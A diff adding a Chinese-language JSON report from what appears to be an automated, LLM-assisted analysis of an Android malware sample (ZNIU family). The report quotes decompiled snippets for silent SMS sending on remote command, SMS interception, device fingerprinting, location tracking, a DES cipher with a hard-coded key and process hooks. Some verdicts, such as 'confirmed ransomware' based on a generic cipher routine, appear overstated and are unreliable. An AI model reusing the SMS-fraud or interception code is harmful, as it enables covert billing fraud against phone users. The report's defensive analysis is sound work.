@@ -1,0 +1,243 @@
+{
+  "APK信息": {
+    "文件名": "6aea1e676fa099b9c902389c5eee04511b6fc60febe3ffff0b1ab13c8ef1823e.apk",
+    "sha256": "6aea1e676fa099b9c902389c5eee04511b6fc60febe3ffff0b1ab13c8ef1823e",
+    "包名": "com.tj.tjcty03411",
+    "应用名": "调教初体验",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 854.8
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\ptjsdkzj\\ctyj\\ah;",
+          "method_signature": "if(\"1\".equals(auVar.f166a)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (\"1\".equals(auVar.f166a)) {\n    SmsManager.getDefault().sendTextMessage(auVar.b, null, auVar.c, null, null);\n}",
+          "malicious_code_snippet_context": "      public final void a(au auVar, boolean z) {\n          long j;\n          if (auVar != null && !z) {\n>>>             if (\"1\".equals(auVar.f166a)) {\n>>>                 try {\n>>>                     SmsManager.getDefault().sendTextMessage(auVar.b, null, auVar.c, null, null);\n                      return;\n                  } catch (IllegalArgumentException e) {\n                      dz.c(\"TAG\", \"发送短信出错\");",
+          "behavior_description": "该代码是回调处理逻辑，接收远程服务器下发的指令对象auVar（f166a为指令类型、b为目标号码、c为短信内容）。当指令类型为\"1\"时，直接调用SmsManager.getDefault().sendTextMessage()在后台静默向指定号码发送短信，全程无用户知情与确认，可被用于定制增值业务扣费或发送欺诈短信；指令类型为\"2\"时另起线程执行其他操作。数据流向为：远程C2服务器指令数据→解析为auVar对象→静默发送短信到任意指定号码。该行为与厂商报告中ZNIU恶意家族静默发送扣费短信的行为特征一致。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\ptjsdkzj\\ctyj\\srvi\\SmsPushReceiver;",
+          "method_signature": "a(Context context, ContentResolver contentResolver, String str, SmsPushReceiver smsPushReceiver, String str2, String str3)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "dz.a(\"TAG\", \"--abortBroadcast-msg--\" + str2 + \":\" + str3);\nba baVar = SdkPay$1$1.readxml(context);\nif (baVar != null) {\n    ArrayList arrayList = new ArrayList();\n    if (baVar.f != null && baVar.f.size() > 0) {\n        arrayList.addAll(baVar.f);\n    }\n    if (baVar.g != null && baVar.g.size() > 0) {\n        arrayList.addAll(baVar.g);\n    }\n}",
+          "malicious_code_snippet_context": "          int iIndexOf;\n          boolean z4;\n          boolean z5;\n>>>         dz.a(\"TAG\", \"--abortBroadcast-msg--\" + str2 + \":\" + str3);\n>>>         ba baVar = SdkPay$1$1.readxml(context);\n>>>         if (baVar != null) {\n>>>             ArrayList arrayList = new ArrayList();\n>>>             if (baVar.f != null && baVar.f.size() > 0) {\n>>>                 arrayList.addAll(baVar.f);\n>>>             }\n>>>             if (baVar.g != null && baVar.g.size() > 0) {\n>>>                 arrayList.addAll(baVar.g);\n>>>             }\n>>>             dz.b(\"FS::\" + arrayList.size());\n              String strSubstring = \"\";\n              Iterator it = arrayList.iterator();\n              boolean z6 = false;",
+          "behavior_description": "该代码位于短信广播接收器 SmsPushReceiver 的处理方法中。接收到新短信（发送方号码 str2、短信内容 str3）后，通过 SdkPay$1$1.readxml(context) 读取本地保存的拦截规则配置对象 ba，将其中的两组过滤名单（ba.f 与 ba.g，通常为特定发送号码或关键词规则）合并为拦截规则列表，用于判断当前短信是否命中拦截条件；日志标记 '--abortBroadcast-msg--' 表明命中规则后会调用 abortBroadcast() 终止短信广播，使该短信无法到达系统收件箱及其他应用，用户对被拦截短信完全无感知。数据流向：系统短信广播（source：短信号码与内容）→ readxml 读取的拦截规则匹配 → abortBroadcast() 静默隐藏短信（sink）。结合该样本属于 ZNIU 家族（利用 Dirty COW 提权、以短信欺诈为目的的恶意软件），此行为用于拦截运营商扣费确认短信和验证码短信，配合后台静默订阅增值业务，直接造成用户经济损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getImei",
+          "getSubscriberId",
+          "ANDROID_ID",
+          "getMacAddress"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\goldcoast\\sdk\\c\\d;",
+          "method_signature": "d()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "bVar.c(d());\nbVar.e(b());\nbVar.f(String.valueOf(System.currentTimeMillis()));\nreturn ((TelephonyManager) b.getSystemService(\"phone\")).getDeviceId();\nreturn Settings.Secure.getString(b.getContentResolver(), \"android_id\");",
+          "malicious_code_snippet_context": "          bVar.a(eVarC);\n          bVar.b(str2);\n          bVar.a(str);\n>>>         bVar.c(d());\n>>>         bVar.e(b());\n>>>         bVar.d(e());\n>>>         bVar.g(b.a());\n>>>         bVar.f(String.valueOf(System.currentTimeMillis()));\n          return bVar;\n      }\n  ",
+          "behavior_description": "该代码是 ZNIU 恶意样本（goldcoast SDK）中的设备指纹采集模块。通过 TelephonyManager.getDeviceId() 窃取设备 IMEI，通过 Settings.Secure.getString() 读取 Android ID，并连同 System.currentTimeMillis() 时间戳一起聚合填充到 bVar 设备指纹对象中返回。数据流向：getDeviceId()/android_id/系统时间戳 → 聚合构建唯一设备指纹对象 → 由恶意 SDK 收集用于唯一标识和跟踪受感染设备，为后续向 C2 服务器上报受害者信息提供支撑，属于恶意隐私窃取行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION",
+          "android.permission.ACCESS_COARSE_LOCATION"
+        ],
+        "字符串": [
+          "getLastKnownLocation",
+          "requestLocationUpdates"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\lotuseed\\android\\i;",
+          "method_signature": "if(i.e != null && i.d != null)",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (i.e != null && i.d != null) {\n    i.e.requestLocationUpdates(i.f, 0L, 3.0f, i.d);\n}",
+          "malicious_code_snippet_context": "          public final void handleMessage(Message msg) {\n              switch (msg.what) {\n                  case 0:\n>>>                     if (i.e != null && i.d != null) {\n>>>                         i.e.requestLocationUpdates(i.f, 0L, 3.0f, i.d);\n>>>                         break;\n                      }\n                      break;\n                  case 1:",
+          "behavior_description": "该代码位于第三方统计SDK（com.lotuseed.android）内部，通过 Handler 消息机制隐蔽地控制位置追踪：收到消息 0 时调用 LocationManager.requestLocationUpdates()，以最短时间间隔（0毫秒）和最小触发距离（3米）注册位置监听器，高频持续采集用户精确地理位置；收到消息 1 时调用 removeUpdates() 停止采集。数据流向为：系统定位服务（LocationManager）→ requestLocationUpdates 注册监听 → LocationListener 回调（i.d）实时接收用户位置数据，供 SDK 后续统计上报使用。整个过程在后台静默进行，用户无感知，属于 SDK 隐蔽的隐私过度收集行为，且该宿主 APK 为已确认的恶意样本（ZNIU），位置数据存在被进一步利用的风险。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lbn\\tt\\a\\b;",
+          "method_signature": "if(str == null)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (str == null) { str = f53a; }\nSecretKey secretKey = SecretKeyFactory.getInstance(bn.tt.d.a.b(\"721712D552E8A584\", \"c291041a-cc2e-438f-9907-65f65c05ae58\")).generateSecret(new DESKeySpec(str.getBytes()));\nCipher cipher = Cipher.getInstance(c);\ncipher.init(i, secretKey, secureRandom);\nreturn cipher.doFinal(bArr);",
+          "malicious_code_snippet_context": "if (str == null) { str = f53a; }\nSecretKey secretKey = SecretKeyFactory.getInstance(bn.tt.d.a.b(\"721712D552E8A584\", \"c291041a-cc2e-438f-9907-65f65c05ae58\")).generateSecret(new DESKeySpec(str.getBytes()));\nCipher cipher = Cipher.getInstance(c);\ncipher.init(i, secretKey, secureRandom);\nreturn cipher.doFinal(bArr);",
+          "behavior_description": "该代码是恶意样本（ZNIU家族，混淆包名bn.tt.a.b）内置的DES加解密引擎。当调用方未传入密钥时，回退使用硬编码的默认密钥f53a；加密算法名称本身也通过混淆字符串解密获得（bn.tt.d.a.b(\"721712D552E8A584\",...)解密出DES算法名），以规避静态检测。随后用密钥字符串字节生成DES密钥，初始化Cipher（参数i区分加密/解密模式，包装方法a(str,bArr)固定使用模式2），最终对传入的字节数组bArr执行cipher.doFinal完成加密/解密。数据流向：硬编码默认密钥f53a或调用方密钥 + 待处理数据bArr → DES加密算法 → 密文输出。在已确认的恶意样本上下文中，该加密模块是文件/数据加密行为的核心实现，且通过字符串混淆隐藏算法细节，属于恶意加密组件。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lan\\d\\t\\y\\De;",
+          "method_signature": "b(File file)",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static File b(File file) {\n    File[] fileArrListFiles = file.listFiles();\n    if (fileArrListFiles == null || fileArrListFiles.length < 1) {\n        return null;\n    }\n    int length = fileArrListFiles.length;\n    while (i3 < length) {\n        File file4 = fileArrListFiles[i3];\n        // 递归遍历并按条件筛选目标文件\n    }\n}",
+          "malicious_code_snippet_context": "      }\n  \n      /* JADX WARN: Code duplicated, block: B:18:0x003c  */\n>>>     public static File b(File file) {\n>>>         int i;\n>>>         File file2;\n>>>         int iIntValue;\n>>>         int i2;\n>>>         File[] fileArrListFiles = file.listFiles();\n>>>         if (fileArrListFiles == null || fileArrListFiles.length < 1) {\n>>>             i = 0;\n>>>             file2 = null;\n>>>         } else {\n>>>             int length = fileArrListFiles.length;\n              File file3 = null;\n              i = 0;\n              int i3 = 0;",
+          "behavior_description": "该方法通过 file.listFiles() 枚举指定目录下的所有文件，并在循环中逐个检查文件对象（结合变量 i/file2 的状态跟踪，疑似按大小或属性筛选并递归查找特定目标文件）。该代码位于混淆类 Lan\\d\\t\\y\\De 中，属于 ZNIU 恶意样本（利用 Dirty COW CVE-2016-5195 提权）的组件。数据流向：文件系统目录→listFiles() 枚举→逐文件遍历筛选→返回目标 File 对象，为后续的文件窃取、载荷定位或提权后文件操作提供支撑。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "process_kill",
+      "中文名": "进程杀死",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "killBackgroundProcesses",
+          "killProcess"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\alibaba\\core\\systemservice\\AndroidAppIActivityManager;",
+          "method_signature": "beforeInvoke(Object obj, Method method, Object[] objArr)",
+          "malicious_behavior": "process_kill",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static class killBackgroundProcesses extends MethodDelegate {\n    public Object beforeInvoke(Object obj, Method method, Object[] objArr) {\n        return super.beforeInvoke(obj, method, objArr);\n    }\n}\nstatic {\n    sMethods.put(\"getRunningAppProcesses\", new getRunningAppProcesses());\n    sMethods.put(\"killBackgroundProcesses\", new killBackgroundProcesses());\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public static class killBackgroundProcesses extends MethodDelegate {\n>>>         @Override // com.alibaba.core.proxy.MethodDelegate\n>>>         public Object beforeInvoke(Object obj, Method method, Object[] objArr) {\n>>>             LogUtil.e(\"beforeInvoke\", method.getName());\n>>>             return super.beforeInvoke(obj, method, objArr);\n>>>         }\n>>>     }\n>>> \n>>>     static {\n          sMethods.put(\"getRunningAppProcesses\", new getRunningAppProcesses());\n          sMethods.put(\"killBackgroundProcesses\", new killBackgroundProcesses());\n          sMethods.put(\"getServices\", new getServices());",
+          "behavior_description": "该代码位于伪装成阿里巴巴库的 com.alibaba.core 钩子框架中，通过动态代理挂钩(hook)系统 IActivityManager 的 killBackgroundProcesses 和 getRunningAppProcesses 方法，在系统调用执行前插入 beforeInvoke 拦截逻辑，从而能够拦截、篡改或放行'杀死后台进程'和'获取运行中进程列表'的系统调用。数据流向：IActivityManager 代理拦截(source) → killBackgroundProcesses 进程查杀控制(sink)。结合该样本为 ZNIU（Dirty COW 提权漏洞利用家族）确认恶意样本的背景，此类系统服务挂钩典型用途为：杀死安全软件/竞争应用的后台进程以规避查杀，或在 getRunningAppProcesses 中隐藏自身进程实现隐蔽驻留与自我保护，属于恶意软件的隐蔽性与对抗性基础设施。但该片段本身仅注册钩子并透传调用，需配合框架其他逻辑才能产生直接危害，故风险等级为中。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
